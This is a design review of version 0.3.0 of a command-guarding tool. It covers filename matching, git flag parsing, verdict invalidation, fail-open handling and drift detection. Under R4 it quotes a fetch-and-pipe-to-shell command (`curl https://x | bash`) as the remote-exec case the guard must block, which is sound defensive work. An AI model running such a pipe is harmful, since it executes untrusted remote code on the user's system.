# Spec review — 0.3.0

Reviewed against `fleet-core.ts` @ `a10c5fb`, not against the spec's intentions.

**Verdict: changes required.** Five amendments (R1–R5), one accepted risk (R6).

---

## R1 — BLOCKER · `toLowerCase()` destroys Linux filenames

**Where:** C1 acceptance, and any matcher built the way the spec implies.

Spec says classification happens "by command name plus argument inspection, not
by substring anywhere in the line", and shows a negated-token skip list. A
case-insensitive `git` match turns `/bin/GIT`, `~/bin/git`, and `./GIT` into
`git commit`. Worse, the 0.2.0 regex `\bgit\s+commit\b` already matches
`/usr/bin/git commit` because `/` is a word boundary — so 0.2.0 blocks commands
it should allow *and* misses ones it should block.

The tokenizer fixes half of this by tokenizing on whitespace; the matcher must
then be case-sensitive and compare against the bare basename. Decide both.

## R2 — BLOCKER · `commandName` breaks on `git -c k=v status`

**Where:** C1 `commandName`.

The spec skips wrappers (`sudo`, `env`, `command`) but says nothing about git's
own pre-subcommand options. `git -c user.email=x commit` and
`git --work-tree=/tmp commit` both put a flag before the subcommand, so
"first non-flag token" yields `-c` / `--work-tree` and the classification misses
the commit. `git` must be special-cased: consume leading `-x`/`--xxx[=value]`,
and for `-c` consume its paired value too.

## R3 — BLOCKER · `invalidateVerdictOnRewind: false` reintroduces D3

**Where:** C3 vs C5.

D3 is described as a **High** severity defect — a stale PASS satisfies the
Phase 9 gate. C5 then offers `invalidateVerdictOnRewind` as a config flag, which
means a user can set `false` and be back to D3, with a config file rather than a
bug. A switch that reopens a High defect is not a switch.

**Resolution: remove the flag.** If D3 is real, D3 is not optional. Drop
`invalidateVerdictOnRewind` from the C5 schema entirely. The other C5 flags
(`enabled`, `sessionGuards`) gate *usability* concerns and stay.

## R4 — MAJOR · Fail-open contradicts `remote-exec`

**Where:** C1 risks table vs C1 design.

The risk mitigation says "Fails **open** on parse uncertainty". That is right for
false positives and wrong for `remote-exec`: `curl https://x | bash` is the
highest-consequence thing on the list, and a tokenizer that gives up on odd
quoting must still catch a pipe into a shell.

Resolve the tension explicitly: parse uncertainty fails open **except** where a
pipe target is a shell interpreter, in which case it fails closed.

## R5 — MAJOR · Drift detector invents a timestamp that does not exist

**Where:** C2 `detectDrift`, "stale when its `*Generated by*` timestamp predates
the store's last mutation".

`fleet-state.json` currently has no `updatedAt` field, and nothing writes one.
Writers stamp `new Date().toISOString()` into the document while `saveState`
writes no timestamp at all, so the comparison as specified has nothing to compare
against. Worse, if the document is written *before* the store, every document
reads as newer and drift never fires.

Either add `state.updatedAt` (written in `saveState`) and order the writes
store-then-document, or drop timestamp comparison and use id-set comparison
only. Id-set comparison is sufficient to catch the stated failure and has no
ordering hazard.

## R6 — ACCEPTED · Session guard can trap a user

The Phase 8 + non-empty-queue trigger is correct but a user who genuinely wants
to switch sessions mid-decision has no route except editing config. Mitigation is
`sessionGuards: false`, plus auditing every cancel so the block is visible rather
than mysterious. Accepted as a known rough edge, documented in README
limitations rather than solved.

## Also checked and found clean

- `installEnforcement` is called once, from `fleet-orchestrator`, so C3 adding
  hooks there reaches every extension in the stack. No duplicate registration.
- Every 0.2.0 REJECT path has an existing regression test
  (`dangling FMT-999`, `module dependency cycle`, `leaky contract`), so C2's
  rewrite of the input source is guarded.
- `.pi/fleet-gate.json` is correctly outside `architecture/` (which is
  gitignored) — the mistake the 0.3.0 change inventory flagged.
- `session_before_switch` and `session_before_fork` return `{ cancel: true }`,
  confirmed against pi docs line 416–443.
- C4's `aborted` helper is honest about scope: nothing in the fleet is
  long-running, and the spec says so instead of implying otherwise.
